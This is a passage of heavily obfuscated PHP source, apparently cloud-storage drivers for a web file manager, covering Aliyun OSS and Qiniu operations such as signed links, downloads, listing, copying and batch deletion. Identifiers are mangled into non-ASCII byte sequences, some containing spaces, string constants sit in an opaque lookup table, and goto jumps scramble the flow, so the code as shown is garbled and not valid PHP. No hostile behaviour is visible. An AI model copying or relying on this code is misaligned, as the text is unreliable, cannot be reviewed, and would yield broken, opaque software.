$eëÒ™îäÇÌ[4] . $cÂÎÙâ®•Ç[$bÑ»—¡Àã—]); } } if (isset($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[227]]) && $B»øáÖ±Ã¶[$eëÒ™îäÇÌ[227]] == $eëÒ™îäÇÌ[228]) { $c¶ëÉµû —[0] = $eëÒ™îäÇÌ[228]; } goto EΩÁ™¢¨¬∂; BóÊéŸ∞ã®: $bœ¢‚Ñè„è = $eëÒ™îäÇÌ[1289] . $this->accessKey . $eëÒ™îäÇÌ[4] . $C–ó¬ìÏ‘…; if (strpos($eÕ®∏Ò…Ÿá, $eëÒ™îäÇÌ[225]) === 0) { $bœ¢‚Ñè„è = array($eëÒ™îäÇÌ[232] => $bœ¢‚Ñè„è, $eëÒ™îäÇÌ[222] => $C∏≤∆Ç◊Ñù); if ($cÂÎÙâ®•Ç) { $bœ¢‚Ñè„è = array_merge($bœ¢‚Ñè„è, $cÂÎÙâ®•Ç); } } return $bœ¢‚Ñè„è; goto FÌŸà—¥µÈ; EΩÁ™¢¨¬∂: if (!empty($B»øáÖ±Ã¶[$eëÒ™îäÇÌ[1325]])) { $CøŸ´ﬂ⁄Í˘ = array_merge(array($c¶ëÉµû —[4]), $B»øáÖ±Ã¶[$eëÒ™îäÇÌ[1325]]); sort($CøŸ´ﬂ⁄Í˘); $c¶ëÉµû —[4] = implode($eëÒ™îäÇÌ[229], $CøŸ´ﬂ⁄Í˘); } $CóœùÀÁ≥£ = implode($eëÒ™îäÇÌ[229], $c¶ëÉµû —); $C–ó¬ìÏ‘… = base64_encode(hash_hmac($eëÒ™îäÇÌ[230], $CóœùÀÁ≥£, $this->secret, !0)); goto BóÊéŸ∞ã®; FÌŸà—¥µÈ: } public function listUploadParts($aÖÛËÔÔΩΩ, $f¡È⁄Êù¨Ü) { goto AÁ®¥Æ£èı; AÁÖàÎ®©ò: unset($f¡È⁄Êù¨Ü[$eì∑˘›≥◊Ω[223]], $f¡È⁄Êù¨Ü[$eì∑˘›≥◊Ω[227]]); $d≥ıì˘”å = $this->multiUploadAuthData($aÖÛËÔÔΩΩ, $f¡È⁄Êù¨Ü); if (empty($d≥ıì˘”å)) { return !1; } goto E≥≥êèËóÖ; Bﬂ°ÁãÉﬂˆ: $d„íº£¨ñ„ = $F»¥°åïƒë->getListPart(); $bíøÉÒïÑ¬ = array(); foreach ($d„íº£¨ñ„ as $Báß‚¯Ê«à) { $bíøÉÒïÑ¬[] = array($eì∑˘›≥◊Ω[1309] => $Báß‚¯Ê«à->getPartNumber(), $eì∑˘›≥◊Ω[1310] => trim($Báß‚¯Ê«à->getETag(), $eì∑˘›≥◊Ω[116])); } goto AÁÖàÎ®©ò; E≥≥êèËóÖ: return array($eì∑˘›≥◊Ω[232] => $d≥ıì˘”å, $eì∑˘›≥◊Ω[222] => $f¡È⁄Êù¨Ü[$eì∑˘›≥◊Ω[222]], $eì∑˘›≥◊Ω[234] => $bíøÉÒïÑ¬); goto F‡ ™üﬁåË; AÁ®¥Æ£èı: $eì∑˘›≥◊Ω =& $_SERVER[’ÿƒ†ïò]; $B”îﬂë£äó = parse_url_query($f¡È⁄Êù¨Ü[$eì∑˘›≥◊Ω[168]]); $F»¥°åïƒë = $this->client->listParts($this->bucket, $this->pathEncode($aÖÛËÔÔΩΩ), $B”îﬂë£äó[$eì∑˘›≥◊Ω[221]]); goto Bﬂ°ÁãÉﬂˆ; F‡ ™üﬁåË: } public function download($c‡Ωª‘‚ØŸ, $C“∑¥“¨íº) { if ($this->isFolder($c‡Ωª‘‚ØŸ)) { return !1; } try { $DÃπ˜±à–› = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $C“∑¥“¨íº); $DÃπ˜±à–› = $this->trafficLimit($_SERVER[’ÿƒ†ïò][109], $DÃπ˜±à–›); $this->client->getObject($this->bucket, $this->pathEncode($c‡Ωª‘‚ØŸ), $DÃπ˜±à–›); } catch (OSS\Core\OssException $DªËèâî»í) { return !1; } return $C“∑¥“¨íº; } public function fileSubstr($CÈàüÏﬁˆı, $f∫«Û‚°Àå = 0, $d¨…Ûê˜”ê = false) { if ($f∫«Û‚°Àå === -1) { $CÉ‹¿àø è = array(); } else { if ($d¨…Ûê˜”ê === !1) { $b≥ÿª†Üºª = $this->size($CÈàüÏﬁˆı); } else { $b≥ÿª†Üºª = $f∫«Û‚°Àå + $d¨…Ûê˜”ê - 1; } $CÉ‹¿àø è = array(OSS\OssClient::OSS_RANGE => "{$f∫«Û‚°Àå}\55{$b≥ÿª†Üºª}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($CÈàüÏﬁˆı), $CÉ‹¿àø è); } catch (OSS\Core\OssException $E†ŒÁ ◊◊Ω) { think_exception($E†ŒÁ ◊◊Ω->getMessage()); return !1; } } private function trafficLimit($bµ™Ê¥ã“ó, $bÉﬂ≥Ã‰≥Ö = array()) { goto AÉÊÜÍ÷“÷; dëÃ·ΩÊÕÂ: if (!$b±ƒæ ·Öç) { return $bÉﬂ≥Ã‰≥Ö; } $b±ƒæ ·Öç = $b±ƒæ ·Öç < 819200 ? 819200 : ($b±ƒæ ·Öç > 838860800 ? 838860800 : $b±ƒæ ·Öç); $bÉﬂ≥Ã‰≥Ö[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($b±ƒæ ·Öç); goto Aâ≤ºâíâŒ; AÉÊÜÍ÷“÷: $aáëƒ…ÿ˘” =& $_SERVER[’ÿƒ†ïò]; if ($bµ™Ê¥ã“ó == $aáëƒ…ÿ˘”[1315] && $this->isUploadServer() || $bµ™Ê¥ã“ó == $aáëƒ…ÿ˘”[109] && $this->isFileOutServer()) { return $bÉﬂ≥Ã‰≥Ö; } $b±ƒæ ·Öç = floatval($GLOBALS[$aáëƒ…ÿ˘”[6]][$aáëƒ…ÿ˘”[88]][$aáëƒ…ÿ˘”[107]][$bµ™Ê¥ã“ó]) * 1024 * 1024 * 8; goto dëÃ·ΩÊÕÂ; Aâ≤ºâíâŒ: return $bÉﬂ≥Ã‰≥Ö; goto E–—àùáôë; E–—àùáôë: } public function link($F‡•€»≥Üà, $CÆáÌ√È€ = array()) { $EÕãñ≠ç√° =& $_SERVER[’ÿƒ†ïò]; if (!$this->exist($F‡•€»≥Üà) || $this->isFolder($F‡•€»≥Üà)) { return !1; } try { $CÆáÌ√È€ = $this->trafficLimit($EÕãñ≠ç√°[109], $CÆáÌ√È€); $c‹†ãπ¨‡† = $this->client->signUrl($this->bucket, $this->pathEncode($F‡•€»≥Üà), 3600 * 12, $EÕãñ≠ç√°[228], $CÆáÌ√È€); return $this->getCdnLink($c‹†ãπ¨‡†); } catch (OSS\Core\OssException $CıÈ›Ú«¢®) { return !1; } } public function fileOut($b‚ô°˜Ñ›è, $D∞ë≥ˆÂ•„ = false, $eæÊ£¶ı“› = false, $C¡æ‹Çéì‰ = '') { goto c≈⁄éîÃ±√; Eªæ”— ãÿ: $b©ˆŒò‹°ë = $this->link($b‚ô°˜Ñ›è, $AàŒ·¶®æ¥); $this->fileOutLink($b©ˆŒò‹°ë); goto F∑øÑπüµ‡; c≈⁄éîÃ±√: $E∫ÊØ¡œ´Î =& $_SERVER[’ÿƒ†ïò]; if ($this->isFileOutServer()) { return $this->fileOutServer($b‚ô°˜Ñ›è, $D∞ë≥ˆÂ•„, $eæÊ£¶ı“›, $C¡æ‹Çéì‰); } if (!$eæÊ£¶ı“›) { $eæÊ£¶ı“› = $this->pathThis($b‚ô°˜Ñ›è); } goto a ›óÓ‹≠Ñ; a ›óÓ‹≠Ñ: $eæÊ£¶ı“› = rawurlencode($eæÊ£¶ı“›); $dãçˆªîÒÌ = get_file_mime(get_path_ext($eæÊ£¶ı“›)); if ($dãçˆªîÒÌ == $E∫ÊØ¡œ´Î[213]) { return parent::fileOut($b‚ô°˜Ñ›è, $D∞ë≥ˆÂ•„, $eæÊ£¶ı“›, $C¡æ‹Çéì‰); } goto eå°ÌÖ≥Õ‚; eå°ÌÖ≥Õ‚: $D∞ë≥ˆÂ•„ = $D∞ë≥ˆÂ•„ ? $E∫ÊØ¡œ´Î[214] : $E∫ÊØ¡œ´Î[215]; $AàŒ·¶®æ¥ = array(OSS\OssClient::OSS_SUB_RESOURCE => $E∫ÊØ¡œ´Î[1326] . rawurlencode("{$D∞ë≥ˆÂ•„}\x3b\x66\151\154\x65\156\x61\155\x65\75{$eæÊ£¶ı“›}")); $AàŒ·¶®æ¥[OSS\OssClient::OSS_SUB_RESOURCE] .= $E∫ÊØ¡œ´Î[1327] . rawurlencode($dãçˆªîÒÌ); goto Eªæ”— ãÿ; F∑øÑπüµ‡: } public function fileOutServer($e£ªÇá¡ôë, $féπ£‹àáë = false, $a¥Ê«ê•≠™ = false, $B‡∫≈âò∫è = '') { parent::fileOut($e£ªÇá¡ôë, $féπ£‹àáë, $a¥Ê«ê•≠™, $B‡∫≈âò∫è); } public function fileOutImage($eâ¢»£ﬂ±ò, $cáÍÿùÜæÓ = 250) { $CÈ≠ÓåïΩÓ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[’ÿƒ†ïò][1328] . $cáÍÿùÜæÓ); $BÙ∏ê∏îÀ¬ = $this->link($eâ¢»£ﬂ±ò, $CÈ≠ÓåïΩÓ); $this->fileOutLink($BÙ∏ê∏îÀ¬); } public function fileOutImageServer($fèÒ¥‡Ñãƒ, $A¿ÈŒ«”‡„ = 250) { parent::fileOutImage($fèÒ¥‡Ñãƒ, $A¿ÈŒ«”‡„); } public function fileOutLink($c«áΩ˘ñ˘Í) { $BûâÔûßãö =& $_SERVER[’ÿƒ†ïò]; if (!$this->isCdnHost() && substr($c«áΩ˘ñ˘Í, 0, 7) == $BûâÔûßãö[1232]) { $c«áΩ˘ñ˘Í = $BûâÔûßãö[1233] . substr($c«áΩ˘ñ˘Í, 7); } header($BûâÔûßãö[159] . $c«áΩ˘ñ˘Í); die; } public function hashMd5($FæÌÒæƒ·π, $c§ﬁ…Ê≥ëç = '') { $B¯ÖπÃöé˘ =& $_SERVER[’ÿƒ†ïò]; $Cù …ÆõÑÎ = $this->_objectMeta($FæÌÒæƒ·π); if (!$Cù …ÆõÑÎ) { return $B¯ÖπÃöé˘[33]; } if (!isset($Cù …ÆõÑÎ[$B¯ÖπÃöé˘[1305]]) && !empty($c§ﬁ…Ê≥ëç)) { $cëΩ‹£»Òœ = $this->updateObjMeta($FæÌÒæƒ·π, array($B¯ÖπÃöé˘[1305] => $c§ﬁ…Ê≥ëç)); $Cù …ÆõÑÎ[$B¯ÖπÃöé˘[1305]] = $cëΩ‹£»Òœ ? $c§ﬁ…Ê≥ëç : $B¯ÖπÃöé˘[33]; } return isset($Cù …ÆõÑÎ[$B¯ÖπÃöé˘[1305]]) ? strtolower($Cù …ÆõÑÎ[$B¯ÖπÃöé˘[1305]]) : $B¯ÖπÃöé˘[33]; } public function size($Bå∂£ÎŸ‹Ì) { $e–æ·Õƒäà = $this->objectMeta($Bå∂£ÎŸ‹Ì); return $e–æ·Õƒäà ? $e–æ·Õƒäà[$_SERVER[’ÿƒ†ïò][78]] : 0; } public function info($Cã«Í»—◊™) { if ($this->isFolder($Cã«Í»—◊™)) { return $this->folderInfo($Cã«Í»—◊™); } else { if ($this->isFile($Cã«Í»—◊™)) { return $this->fileInfo($Cã«Í»—◊™); } } return !1; } public function exist($b∂‚§åÂ¬º) { return $this->isFile($b∂‚§åÂ¬º) || $this->isFolder($b∂‚§åÂ¬º); } public function isFile($aÊùåÜµ«§) { return !$this->isFolder($aÊùåÜµ«§) && $this->objectMeta($aÊùåÜµ«§); } public function isFolder($D°ÉæãâÆê) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][199], $D°ÉæãâÆê); } protected function objectMeta($dÁú±üØŸÙ) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][200], $dÁú±üØŸÙ); } protected function _objectMeta($F±¬Û≈´∞„) { $Eàîü‡Ω–÷ =& $_SERVER[’ÿƒ†ïò]; try { $C≤ÆéÎﬁ≈ì = $this->client->getObjectMeta($this->bucket, $this->pathEncode($F±¬Û≈´∞„)); } catch (OSS\Core\OssException $CàËãÒªÀ) { $C≤ÆéÎﬁ≈ì = !1; } if ($C≤ÆéÎﬁ≈ì) { $C≤ÆéÎﬁ≈ì[$Eàîü‡Ω–÷[78]] = intval($C≤ÆéÎﬁ≈ì[$Eàîü‡Ω–÷[1303]]); } return $C≤ÆéÎﬁ≈ì; } protected function _isFolder($BÏ∫¡±·Çˆ) { $E‘êÀäÕ«ö =& $_SERVER[’ÿƒ†ïò]; if ($BÏ∫¡±·Çˆ == $E‘êÀäÕ«ö[33] || $BÏ∫¡±·Çˆ == $E‘êÀäÕ«ö[8]) { return !0; } $AòµØ‹˜°» = array($E‘êÀäÕ«ö[1299] => $E‘êÀäÕ«ö[8], $E‘êÀäÕ«ö[1300] => rtrim($BÏ∫¡±·Çˆ, $E‘êÀäÕ«ö[8]) . $E‘êÀäÕ«ö[8], $E‘êÀäÕ«ö[1301] => 1, $E‘êÀäÕ«ö[1302] => $E‘êÀäÕ«ö[33]); $eªñˆŸ˜÷Ñ = $this->client->listObjects($this->bucket, $AòµØ‹˜°»); if ($eªñˆŸ˜÷Ñ->getObjectList() || $eªñˆŸ˜÷Ñ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($bêƒøßª◊„) { parent::__construct(); require_once SDK_DIR . $_SERVER[’ÿƒ†ïò][1329]; $this->_init($bêƒøßª◊„); } public function _init($F≤î”ô„Öﬂ) { goto EŒ∆Ó»∫”ä; bå‘´Éﬂ¨ò: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto d”‘ÙöÑéÈ; d”‘ÙöÑéÈ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto CÀ¨∏Ë∫„à; EŒ∆Ó»∫”ä: $eâÖ∑¥âà‡ =& $_SERVER[’ÿƒ†ïò]; foreach ($F≤î”ô„Öﬂ as $c≠÷Ø≠û´à => $bëÇﬁÃÔÎÁ) { if (isset($this->{$c≠÷Ø≠û´à})) { $this->{$c≠÷Ø≠û´à} = $bëÇﬁÃÔÎÁ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($eâÖ∑¥âà‡[1330] . LNG($eâÖ∑¥âà‡[1290])); } goto bå‘´Éﬂ¨ò; CÀ¨∏Ë∫„à: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($fØê∞ùâ∫ÿ, $cºﬁÛ˜Óñ– = '', $a‡™¬ŸÑ¬› = REPEAT_RENAME) { if ($this->setContent($fØê∞ùâ∫ÿ, $cºﬁÛ˜Óñ–)) { return $this->getPathOuter($fØê∞ùâ∫ÿ); } return !1; } public function mkdir($aï®˜ØÁ—ü, $cœ˘¢¶ˆø‡ = REPEAT_SKIP) { goto Fäˆ“É”≠«; Fäˆ“É”≠«: $Dñ¡ñîáπâ =& $_SERVER[’ÿƒ†ïò]; $a§º«—†åØ = trim($aï®˜ØÁ—ü, $Dñ¡ñîáπâ[8]); if ($this->_isFolder($a§º«—†åØ)) { return $this->getPathOuter($a§º«—†åØ); } goto A‘πÖ◊⁄ê¶; cΩ‹ÚôäÕ‡: if (!$this->mkfile($D†•Áﬁáﬂø)) { return !1; } if (!$this->moveFile($D†•Áﬁáﬂø, $aï®˜ØÁ—ü)) { $this->delFile($D†•Áﬁáﬂø); return !1; } return $this->getPathOuter($a§º«—†åØ); goto eõ¡ûïç“Ç; A‘πÖ◊⁄ê¶: $aï®˜ØÁ—ü = $a§º«—†åØ . $Dñ¡ñîáπâ[8]; $E≤√‰îÚü¨ = get_path_this($a§º«—†åØ); $D†•Áﬁáﬂø = $aï®˜ØÁ—ü . $E≤√‰îÚü¨; goto cΩ‹ÚôäÕ‡; eõ¡ûïç“Ç: } public function copyFile($FÊÔ≤ûÇΩì, $d„¥¨ù´ãá) { $EÓúÉ‘õ‘È = $this->bucketManager->copy($this->bucket, $FÊÔ≤ûÇΩì, $this->bucket, $d„¥¨ù´ãá, !0); return $EÓúÉ‘õ‘È ? !1 : $this->getPathOuter($d„¥¨ù´ãá); } public function moveFile($bêﬁÙÑÀ, $f®êÍπ‚À´) { $aÜ€‰•ıõŒ = $this->bucketManager->move($this->bucket, $bêﬁÙÑÀ, $this->bucket, $f®êÍπ‚À´, !0); return $aÜ€‰•ıõŒ ? !1 : $this->getPathOuter($f®êÍπ‚À´); } public function delFile($dò¡¥áíàÚ) { if (!$this->exist($dò¡¥áíàÚ)) { return !0; } $aèêÈãç∂È = $this->bucketManager->delete($this->bucket, $dò¡¥áíàÚ); return $aèêÈãç∂È ? !1 : !0; } public function delFolder($cµÙÊ±∆ï ) { goto fá‘ÑÎÃ»¢; c„˘ÁÛúﬂø: $C≈´±Öò™Õ = $this->delByBatch($BÃ¡≤€º§«[$bÚ”¶≤ºä[75]]); if (!$C≈´±Öò™Õ) { return !1; } return $this->delFile($EÑÚÜßøèï); goto aÔ•óç“Ü¨; fá‘ÑÎÃ»¢: $bÚ”¶≤ºä =& $_SERVER[’ÿƒ†ïò]; if (!$this->exist($cµÙÊ±∆ï )) { return !0; } $this->listItemCache = !1; goto e◊¿ÓßΩå§; cÈî¢≥ΩΩØ: if (!empty($cµÙÊ±∆ï ) && $cµÙÊ±∆ï  !== $bÚ”¶≤ºä[191] && !in_array($EÑÚÜßøèï, $BÃ¡≤€º§«[$bÚ”¶≤ºä[75]])) { $BÃ¡≤€º§«[$bÚ”¶≤ºä[75]][] = $EÑÚÜßøèï; } $C≈´±Öò™Õ = $this->delByBatch($BÃ¡≤€º§«[$bÚ”¶≤ºä[74]]); if (!$C≈´±Öò™Õ) { return !1; } goto c„˘ÁÛúﬂø; e◊¿ÓßΩå§: $BÃ¡≤€º§« = $this->fileList($cµÙÊ±∆ï ); $this->listItemCache = !0; $EÑÚÜßøèï = trim($cµÙÊ±∆ï , $bÚ”¶≤ºä[8]) . $bÚ”¶≤ºä[8]; goto cÈî¢≥ΩΩØ; aÔ•óç“Ü¨: } private function delByBatch($BÌÌçó≠Á«) { foreach (array_chunk($BÌÌçó≠Á«, 1000) as $E»¨ŒÁÕ⁄î) { $Fü≈ù¥£ª” = $this->bucketManager->buildBatchDelete($this->bucket, $E»¨ŒÁÕ⁄î); list($FáÍ®æﬁîÆ, $Bâ’Ø”µ™Û) = $this->bucketManager->batch($Fü≈ù¥£ª”); if ($Bâ’Ø”µ™Û) { return !1; } } return !0; } public function rename($DäÌÙà‘Úœ, $A”é∑µ∞ÌÜ) { return $this->renameObject($DäÌÙà‘Úœ, $A”é∑µ∞ÌÜ); } public function fileInfo($cçßÖ∆‹ºô, $Dÿ»êé“€≤ = false, $C∆œˆÒÂ–÷ = array()) { goto Fì≤â∞ÎåÊ; Bìﬂ…≠‰£ô: $b¶«è«ÃâÃ[$e»¢¬ÚÕêñ[194]] = $b¶«è«ÃâÃ[$e»¢¬ÚÕêñ[84]] = 0; $b¶«è«ÃâÃ[$e»¢¬ÚÕêñ[195]] = $b¶«è«ÃâÃ[$e»¢¬ÚÕêñ[196]] = !0; if (empty($C∆œˆÒÂ–÷)) { $C∆œˆÒÂ–÷ = $this->objectMeta($cçßÖ∆‹ºô); if (!$C∆œˆÒÂ–÷) { return $b¶«è«ÃâÃ; } } goto EÀñ¿∏ªì˘; Fì≤â∞ÎåÊ: $e»¢¬ÚÕêñ =& $_SERVER[’ÿƒ†ïò]; $b¶«è«ÃâÃ = array($e»¢¬ÚÕêñ[28] => $this->pathThis($cçßÖ∆‹ºô), $e»¢¬ÚÕêñ[76] => $this->getPathOuter($e»¢¬ÚÕêñ[8] . $cçßÖ∆‹ºô), $e»¢¬ÚÕêñ[29] => $e»¢¬ÚÕêñ[193], $e»¢¬ÚÕêñ[78] => isset($C∆œˆÒÂ–÷[$e»¢¬ÚÕêñ[1331]]) ? $C∆œˆÒÂ–÷[$e»¢¬ÚÕêñ[1331]] : 0, $e»¢¬ÚÕêñ[168] => $this->ext($cçßÖ∆‹ºô)); if ($Dÿ»êé“€≤) { return $b¶«è«ÃâÃ; } goto Bìﬂ…≠‰£ô; EÀñ¿∏ªì˘: if (isset($C∆œˆÒÂ–÷[$e»¢¬ÚÕêñ[1332]])) { $b¶«è«ÃâÃ[$e»¢¬ÚÕêñ[84]] = substr($C∆œˆÒÂ–÷[$e»¢¬ÚÕêñ[1332]] . $e»¢¬ÚÕêñ[33], 0, 10); } if (isset($C∆œˆÒÂ–÷[$e»¢¬ÚÕêñ[1331]])) { $b¶«è«ÃâÃ[$e»¢¬ÚÕêñ[78]] = $C∆œˆÒÂ–÷[$e»¢¬ÚÕêñ[1331]]; } return $b¶«è«ÃâÃ; goto eùÇ‹¡ı≥»; eùÇ‹¡ı≥»: } public function folderInfo($AÎ€÷òòÈä, $FﬂÓ∫à∫ùó = false) { goto bœêÛ”£à°; bœêÛ”£à°: $cÖ¿ûè£ˆ≥ =& $_SERVER[’ÿƒ†ïò]; $E⁄ª•©†é‰ = array($cÖ¿ûè£ˆ≥[28] => $this->pathThis($AÎ€÷òòÈä), $cÖ¿ûè£ˆ≥[76] => $this->getPathOuter($cÖ¿ûè£ˆ≥[8] . $AÎ€÷òòÈä), $cÖ¿ûè£ˆ≥[29] => $cÖ¿ûè£ˆ≥[77]); if ($FﬂÓ∫à∫ùó) { return $E⁄ª•©†é‰; } goto bë∞è»úÕ…; EÒ¿ö¢Î è: $b’◊æ⁄öÛƒ = $this->objectMeta($AÎ€÷òòÈä); if (isset($b’◊æ⁄öÛƒ[$cÖ¿ûè£ˆ≥[1332]])) { $E⁄ª•©†é‰[$cÖ¿ûè£ˆ≥[84]] = substr($b’◊æ⁄öÛƒ[$cÖ¿ûè£ˆ≥[1332]] . $cÖ¿ûè£ˆ≥[33], 0, 10); } return $E⁄ª•©†é‰; goto E©«ï£è∏ì; bë∞è»úÕ…: $E⁄ª•©†é‰[$cÖ¿ûè£ˆ≥[194]] = $E⁄ª•©†é‰[$cÖ¿ûè£ˆ≥[84]] = 0; $E⁄ª•©†é‰[$cÖ¿ûè£ˆ≥[195]] = $E⁄ª•©†é‰[$cÖ¿ûè£ˆ≥[196]] = !0; $AÎ€÷òòÈä = rtrim($AÎ€÷òòÈä, $cÖ¿ûè£ˆ≥[8]) . $cÖ¿ûè£ˆ≥[8]; goto EÒ¿ö¢Î è; E©«ï£è∏ì: } public function listPath($bßÔ≈¯òÑ√, $CÜ–øÜÎêﬂ = false) { $BÕ‚ä±Æå´ =& $_SERVER[’ÿƒ†ïò]; $A´Ø∆±»ÛÓ = $this->fileList($bßÔ≈¯òÑ√, $BÕ‚ä±Æå´[8], !0); foreach ($A´Ø∆±»ÛÓ[$BÕ‚ä±Æå´[75]] as $A–≠”Øß¡ù => $f≥Íë«€´‘) { $A´Ø∆±»ÛÓ[$BÕ‚ä±Æå´[75]][$A–≠”Øß¡ù] = $this->folderInfo($f≥Íë«€´‘, $CÜ–øÜÎêﬂ); } foreach ($A´Ø∆±»ÛÓ[$BÕ‚ä±Æå´[74]] as $A–≠”Øß¡ù => $f≥Íë«€´‘) { $A´Ø∆±»ÛÓ[$BÕ‚ä±Æå´[74]][$A–≠”Øß¡ù] = $this->fileInfo($f≥Íë«€´‘[$BÕ‚ä±Æå´[93]], $CÜ–øÜÎêﬂ, $f≥Íë«€´‘); } return $A´Ø∆±»ÛÓ; } public function has($fˆª–¨Œ—ê, $e´πøÎÓº— = false, $d·‰ü¬á¥ = true) { goto dÖ√ç‚åƒÉ; EÏŒŒÙ≈•Ω: $F·Ó°æ˜ÓÜ = $aî–πß†≥á[33]; $D‰¶ªƒß¯◊ = 500; $e°åáÈ“ùÍ = $aî–πß†≥á[8]; goto E◊•’ãû‡ﬂ; dÖ√ç‚åƒÉ: $aî–πß†≥á =& $_SERVER[’ÿƒ†ïò]; $fˆª–¨Œ—ê = trim($fˆª–¨Œ—ê, $aî–πß†≥á[8]); $b≥÷”€°éÁ = empty($fˆª–¨Œ—ê) && $fˆª–¨Œ—ê !== $aî–πß†≥á[191] ? $aî–πß†≥á[33] : $fˆª–¨Œ—ê . $aî–πß†≥á[8]; goto EÏŒŒÙ≈•Ω; E◊•’ãû‡ﬂ: $Eƒ‹ûÜ‚ıÏ = $F®ìÌ€…„Ó = 0; while (!0) { check_abort(); list($a˜Ÿ≤ÉÊèê, $BﬂªÙ·É∫’) = $this->bucketManager->listFiles($this->bucket, $b≥÷”€°éÁ, $F·Ó°æ˜ÓÜ, $D‰¶ªƒß¯◊, $e°åáÈ“ùÍ); if ($BﬂªÙ·É∫’) { break; } $F·Ó°æ˜ÓÜ = array_key_exists($aî–πß†≥á[1302], $a˜Ÿ≤ÉÊèê) ? $F·Ó°æ˜ÓÜ = $a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1333]] : $aî–πß†≥á[33]; if ($e´πøÎÓº—) { if (!empty($a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1334]])) { $Eƒ‹ûÜ‚ıÏ += count($a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1334]]); } if (!empty($a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1335]])) { $F®ìÌ€…„Ó += count($a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1335]]); } if ($F·Ó°æ˜ÓÜ === $aî–πß†≥á[33]) { break; } continue; } if ($d·‰ü¬á¥) { if (!empty($a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1334]])) { return !0; } } else { if (!empty($a˜Ÿ≤ÉÊèê[$aî–πß†≥á[1335]])) { return !0; } } if ($F·Ó°æ˜ÓÜ === $aî–πß†≥á[33]) { break; } } if ($e´πøÎÓº—) { return array($aî–πß†≥á[203] => $Eƒ‹ûÜ‚ıÏ, $aî–πß†≥á[204] => $F®ìÌ€…„Ó); } goto Dí˜∂Ëâ“ä; Dí˜∂Ëâ“ä: return !1; goto eÇ®ô®¬Ó≤; eÇ®ô®¬Ó≤: } public function listAll($fñÉŸê¥Î’) { $fãáêöπæ® =& $_SERVER[’ÿƒ†ïò]; $bçŸ«’ßÍÁ = $this->fileList($fñÉŸê¥Î’, $fãáêöπæ®[33], !0); $aÖÂÖ◊≥‘º = array(); foreach ($bçŸ«’ßÍÁ[$fãáêöπæ®[74]] as $Dº™’©ååµ) { $aÖÂÖ◊≥‘º[$Dº™’©ååµ[$fãáêöπæ®[93]]] = $Dº™’©ååµ[$fãáêöπæ®[78]]; } foreach ($bçŸ«’ßÍÁ[$fãáêöπæ®[75]] as $Dº™’©ååµ) { if (is_string($Dº™’©ååµ)) { $aÖÂÖ◊≥‘º[$Dº™’©ååµ] = 0; } } return $this->listAllFiles($fñÉŸê¥Î’, array_keys($aÖÂÖ◊≥‘º), $aÖÂÖ◊≥‘º); } private function fileList($b£≤ä¬Öç—, $CÉì‹©ô∫ƒ = '', $Fõ∏îñîÏÉ = 0) { goto fÆ…∂¨™∆⁄; Dæ…ÿÎö∆: return array($Bˆ◊àéüú„[75] => $e¿∞∑¯©“€, $Bˆ◊àéüú„[74] => $Bï≈àµê…√); goto A∆ÁÈÕÇÌò; D£≥⁄ùæ∂: $e¿∞∑¯©“€ = $Bï≈àµê…√ = array(); while (!0) { check_abort(); list($E∞Ì‰ºëâÔ, $EÍ˜€É·ﬂ„) = $this->bucketManager->listFiles($this->bucket, $cÑÊõÒ¬„∏, $e«⁄≤î•§“, $aÍì¡∞ÓËü, $CÉì‹©ô∫ƒ); if ($EÍ˜€É·ﬂ„) { break; } $e«⁄≤î•§“ = array_key_exists($Bˆ◊àéüú„[1302], $E∞Ì‰ºëâÔ) ? $e«⁄≤î•§“ = $E∞Ì‰ºëâÔ[$Bˆ◊àéüú„[1333]] : $Bˆ◊àéüú„[33]; $dãäƒô¨Áπ = isset($E∞Ì‰ºëâÔ[$Bˆ◊àéüú„[1334]]) ? $E∞Ì‰ºëâÔ[$Bˆ◊àéüú„[1334]] : array(); $d∆¬·åîç¥ = isset($E∞Ì‰ºëâÔ[$Bˆ◊àéüú„[1335]]) ? $E∞Ì‰ºëâÔ[$Bˆ◊àéüú„[1335]] : array(); foreach ($dãäƒô¨Áπ as $C´ıÜ∞Ô–ª) { goto eàË»»·â„; bñÕÔîÖ‹»: if ($aøÜ’ì©Ù) { $e¿∞∑¯©“€[] = $E‰™ÉèàÇÉ; continue; } $Bï≈àµê…√[] = $Fõ∏îñîÏÉ ? $C´ıÜ∞Ô–ª : $E‰™ÉèàÇÉ; goto DÃó¬™≤¯õ; eàË»»·â„: if ($C´ıÜ∞Ô–ª[$Bˆ◊àéüú„[93]] == $cÑÊõÒ¬„∏) { continue; } $E‰™ÉèàÇÉ = $C´ıÜ∞Ô–ª[$Bˆ◊àéüú„[93]]; $BÕ’´›ÊŸ„ = $C´ıÜ∞Ô–ª[$Bˆ◊àéüú„[1331]]; goto C–…Ö¨ƒ≥Ω; C–…Ö¨ƒ≥Ω: $C´ıÜ∞Ô–ª[$Bˆ◊àéüú„[78]] = $BÕ’´›ÊŸ„; $aøÜ’ì©Ù = $BÕ’´›ÊŸ„ == 0 && substr($E‰™ÉèàÇÉ, strlen($E‰™ÉèàÇÉ) - 1, 1) == $Bˆ◊àéüú„[8] ? !0 : !1; if ($cê‰ÜªÉß÷) { $this->cacheMethod($Bˆ◊àéüú„[199], $E‰™ÉèàÇÉ, $aøÜ’ì©Ù); $this->cacheMethod($Bˆ◊àéüú„[200], 